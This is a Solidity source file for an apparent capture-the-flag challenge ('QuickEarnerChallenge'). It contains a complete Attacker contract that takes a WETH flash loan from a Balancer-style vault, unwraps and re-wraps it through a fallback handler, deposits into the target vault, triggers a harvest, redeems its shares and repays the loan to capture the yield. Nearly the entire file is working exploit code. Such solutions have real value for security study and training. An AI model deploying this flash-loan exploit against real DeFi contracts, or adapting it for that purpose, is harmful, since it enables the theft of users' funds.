// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import {TheVault} from "src/quick-earner/TheVault.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IVaultA {
    function getPoolTokens(bytes32) external view returns (address[] memory, uint256[] memory, uint256);
    function flashLoan(address,address[] memory,uint256[] memory,bytes memory) external;
}

interface IW {
    function withdraw(uint256) external;
}

contract Attacker {
    TheVault private immutable _theVault;
    uint256 stage;
    uint bAmount;

    constructor(TheVault _vault) {
        _theVault = _vault;
    }

    function executeAttack() external {
        // forge test -vvvvv --match-contract 'QuickEarnerChallenge'
        address[] memory tokens = new address[](1);
        tokens[0] = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = IERC20(tokens[0]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8); // WETH
        bAmount = amounts[0];

        IVaultA(0xBA12222222228d8Ba445958a75a0704d566BF2C8).flashLoan(
            address(this),
            tokens,
            amounts,
            hex""
        );
    }

    fallback() external payable {
        if (stage == 0) {
            stage++;
            IW(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1).withdraw(bAmount);
        } else if (stage == 1) {
            stage++;
            IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1).approve(address(_theVault), type(uint256).max);
            (bool success, ) = address(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1).call{value: address(this).balance}(hex"");
            require(success);

            uint256 shares = _theVault.deposit(bAmount, address(this));
            _theVault.harvest(address(this));

            _theVault.redeem(shares, address(this), address(this));

            IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1).transfer(address(0xBA12222222228d8Ba445958a75a0704d566BF2C8), bAmount);
        } else {
            return;
        }
    }

}